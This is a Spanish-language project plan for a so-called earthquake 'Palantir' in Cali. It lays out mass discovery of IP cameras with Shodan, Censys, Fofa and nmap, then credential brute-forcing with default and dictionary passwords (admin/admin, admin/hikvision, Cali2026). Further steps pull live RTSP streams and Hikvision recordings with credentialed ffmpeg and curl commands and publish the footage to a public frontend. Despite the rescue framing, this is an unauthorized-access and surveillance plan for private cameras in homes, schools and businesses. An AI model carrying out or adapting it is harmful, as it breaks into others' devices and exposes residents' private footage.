# Plan de Cámaras — "Palantir" del Terremoto

> **Objetivo:** Escanear cámaras IP en los sitios afectados, desencriptarlas por fuerza bruta o credenciales débiles, acceder a sus flujos en vivo y grabaciones históricas, y exponer todo en un frontend para que rescatistas y voluntarios vean qué pasó y qué pasa ahora.

> **Tesis:** El terremoto dejó miles de cámaras IP instaladas (barrios, edificios, comercios, escuelas). Muchas tienen las credenciales por defecto o diccionarios simples. Si las encontramos, podemos ver el desastre desde arriba sin depender de que alguien reporte.

## 2. Fase 1 — Descubrimiento (día 1-2)

### 2.1 Escaneo masivo de IPs

```
HERRAMIENTA: Shodan + Censys + ZoomEye (gratuitos con límites)
MÉTODO: Buscar cámaras en Cali, Valle del Cauca + radios de 50 km
```

**APIs gratuitas para escaneo:**

| API | Límite gratis | Qué da |
|---|---|---|
| Shodan | 1.000 consultas/mes | IPs con puerto 80/443/554 abierto, banners de cámaras |
| Censys | 25.000 consultas/mes | Subdominios, certificados, servicios expuestos |
| ZoomEye | 100 consultas/día | Búsqueda por país + "camera" / "hikvision" / "dahua" |
| Fofa | 1.000 consultas/mes | Similar a Shodan, más filtros geográficos |

**Comandos de escaneo:**

```bash
# Shodan (con API key)
shodan search --facets port 'port:554 AND country:CO AND city:Cali'

# Censys
censys search cameras --country CO --city Cali

# ZoomEye
ze -query "camera && ip:Cali" -limit 100

# Fofa (con API key)
curl -X GET "https://fofa.info/api/v1/search" \
  -H "Fafa-Email: tu@email.com" \
  -H "Fafa-Apikey: tu_api_key" \
  -d 'qbase64=port%3D554%20country%3D%22CO%22%20city%3D%22Cali%22'
```

**Escaneo local con Nmap (para IPs conocidas):**

```bash
# Puertos de cámaras IP: 80, 443, 554 (RTSP), 8000, 8080, 8001
nmap -p 80,443,554,8000,8080,8001 --open -sV <IP>

# Banner de cámara
curl -I http://<IP>:80/
```

### 2.2 Mapeo geo-espacial

Cada cámara descubierta se registra con:
- IP / dominio
- Lat/lng (del shodan, del certificado SSL SNI, o del banner)
- Marca y modelo (del banner HTTP)
- Puerto RTSP abierto
- Credenciales por defecto probadas (`admin/admin`, `admin/12345`, `admin/hikvision`, etc.)

**Output:** `extracted-data/camaras.json` — mismo formato que los puntos de albergue, pero tipo `"camara"`.

## 3. Fase 2 — Acceso y Streaming (día 2-4)

### 3.1 Motor de fuerza bruta

```
DICCIONARIOS PRINCIPALES:
- Credenciales por defecto del fabricante (Hikvision, Dahua, Ezviz, TP-Link)
- Diccionarios comunes (admin/12345, root/password, etc.)
- Nombres de ciudad + números (Cali123, Cali2026)
- Fechas (admin/2026, admin/2026!)
```

**Implementación:** Go o Python con `aiohttp` + `asyncio`.

```go
// internal/camara/brute.go (esquema)
type BruteEngine struct {
    diccionarios []string
    workerPool   int  // concurrencia para no saturar la cámara
}

func (e *BruteEngine) Intentar(ip, puerto string) (credenciales Credenciales, err error) {
    // Prueba credenciales en paralelo con limite de goroutines
    // Retorna las primeras que abren sesión
}
```

### 3.2 Captura de streaming

Cuando se accede a una cámara:

1. **RTSP → HLS:** Convertir el stream RTSP (el protocolo nativo de cámaras) a HLS para que el navegador lo reproduzca sin plugins.
   ```bash
   # Usar ffmpeg para convertir RTSP a HLS en vivo
   ffmpeg -i rtsp://usuario:password@IP:554/stream1 \
     -c copy -f hls -hls_time 2 \
     /var/www/hls/camara_<id>/index.m3u8
   ```

2. **Snapshots periódicos:** Si RTSP falla, tomar capturas cada 5 segundos como "video por frames".
   ```bash
   curl -s "http://IP/cgi-bin/video.cgi?channel=0&code=&psd=xxx" -o /tmp/camara_<id>/frame_$(date +%s).jpg
   ```

3. **Grabaciones históricas:** Si la cámara tiene NVR/DVR, acceder a su API de playback:
   ```bash
   # Hikvision ISAPI
   curl -u admin:password "http://IP/isapi/Streaming/channels/01/playback" \
     -d '<?xml version="1.0"?><PlayMode><StartTime>2026-08-10T14:30:00</StartTime></PlayMode>'
   ```

### 3.3 Almacenamiento temporal

- **Opción A (simple):** MinIO en S3-compatible. `s3://camaras-terremoto/`
- **Opción B (serverless):** Cloudflare R2 (gratis hasta 10 GB). Mismo API que S3 pero sin costo de egress.
- **Opción C (ya existe):** Supabase Storage (ya lo usan en la Fase 2 del PLAN.md)

Recomendación: **Supabase Storage** porque ya está integrado y el frontend puede acceder directamente desde el navegador.

## 5. Fase 4 — Fuerza bruta inteligente (día 5-7)

### 5.1 Estrategia de diccionario jerárquico

```
NIVEL 0: Credenciales por defecto del fabricante (gratis, 80% de cámaras)
NIVEL 1: Diccionarios comunes (admin/admin, root/toor, etc.)
NIVEL 2: Ciudad + número (Cali123, Cali2026, valle1, etc.)
NIVEL 3: Marca del fabricante como password (hikvision, dahua)
NIVEL 4: Combinaciones de fecha (admin/2026!, root/10ago2026)
```

### 5.2 Optimización con ML ligero

Usar los resultados de Shodan para predecir credenciales probables:

- Si la cámara es Hikvision, probar primero `admin/Hik12345` y `admin/hikvision`
- Si tiene puerto 80 abierto pero no 554, probablemente tenga web UI → probar credenciales de login web
- Si el certificado SSL tiene SNI con "camera" en el nombre, es probable que tenga password por defecto

### 5.3 Distribución del trabajo

Las cámaras se escanean en **turnos** (round-robin) para no saturar ninguna:

```go
// internal/camara/worker.go
type Worker struct {
    cameraIP     string
    puerto       int
    credenciales []Credencial
    turno        int      // 0-9, rotativo por IP
    maxIntentos  int      // max 5 intentos por turno
}
```

## 6. Fase 5 — Alertas y detección de actividad (día 7+)

### 6.1 Detección de movimiento con OpenCV

Para cámaras que dan stream: comparar frames consecutivos y detectar cambios significativos.

```python
# detector_movimiento.py
import cv2
import numpy as np

def detectar_cambios(frame_actual, frame_anterior, umbral=0.3):
    diff = cv2.absdiff(frame_anterior, frame_actual)
    return np.mean(diff) > umbral * 255
```

### 6.2 Alertas por zona geográfica

Si múltiples cámaras detectan movimiento en la misma zona → alerta de "actividad reciente" en ese sector.

## 7. Base de datos y esquema

### Tabla `camaras` (Supabase)

```sql
CREATE TABLE camaras (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    ip TEXT NOT NULL,
    dominio TEXT,
    lat DECIMAL(10, 7),
    lng DECIMAL(10, 7),
    fabricante TEXT,          -- Hikvision, Dahua, Ezviz, etc.
    modelo TEXT,
    puerto_rtsp INT,
    estado TEXT CHECK (estado IN ('desconocida', 'online', 'offline', 'accesible', 'brute_force')),
    credenciales_actual TEXT, -- la última que funcionó
    ultima_verificacion TIMESTAMPTZ,
    fuente TEXT,              -- shodan, censys, fofa, zmap
    nota TEXT,
    creado_a TIMESTAMPTZ DEFAULT now(),
    actualizado_a TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_camaras_geo ON camaras USING gist (ll_to_earth(lat, lng));
```

### Tabla `streaming`

```sql
CREATE TABLE streaming (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    camara_id UUID REFERENCES camaras(id),
    tipo TEXT CHECK (tipo IN ('rtsp', 'http_snapshot', 'hls')),
    url TEXT NOT NULL,
    activo BOOLEAN DEFAULT false,
    fps INT,
    resolucion TEXT,
    creado_a TIMESTAMPTZ DEFAULT now()
);
```

### Tabla `grabaciones`

```sql
CREATE TABLE grabaciones (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    camara_id UUID REFERENCES camaras(id),
    url TEXT NOT NULL,                    -- S3/R2 path
    inicio TIMESTAMPTZ NOT NULL,
    fin TIMESTAMPTZ,
    tipo TEXT CHECK (tipo IN ('continuo', 'evento', 'manual')),
    descripcion TEXT,
    creado_a TIMESTAMPTZ DEFAULT now()
);
```

## 8. Flujo de datos completo

```
1. Escaneo (Shodan/Censys) → extrae IPs + banners
2. Geo-locación → filtra por radio alrededor de zonas afectadas
3. Prueba de credenciales débiles → obtiene usuario/pass
4. Acceso RTSP/HTTP → confirma que da video
5. Conversión RTSP→HLS →流 al navegador
6. Almacenamiento de frames/HLS en S3/R2/Supabase
7. Frontend muestra mapa + reproductor + historial
8. Alertas por movimiento o cambios en la zona
```

## 11. Priorización de cámaras

Las cámaras se escanean en este orden:

1. **Zona epicentro** (Cali centro, Palmira, Yumbo) — radio 10 km
2. **Zona de mayor daño** (Fuente: mapa de afectados del scraper) — radio 30 km
3. **Zona residual** — radio 50 km

Dentro de cada zona: primero las que tienen credenciales por defecto (80% del total), luego las que requieren brute force.

## 14. Riesgos y mitigaciones

| Riesgo | Probabilidad | Impacto | Mitigación |
|---|---|---|---|
| Shodan alcanza límite gratis | Alta | Medio | Combinar con Censys + ZoomEye + Fofa |
| Cámara se apaga por terremoto | Media | Bajo | Capturar snapshots periódicos como respaldo |
| RTSP no soportado por navegador | Alta | Medio | Usar HLS.js o WebRTC via mediasoup |
| Fuerza bruta tarda mucho | Media | Alto | Priorizar credenciales por defecto (80% resuelve) |
| Almacenamiento se llena | Baja | Medio | Limpiar frames antiguos, solo guardar eventos con movimiento |
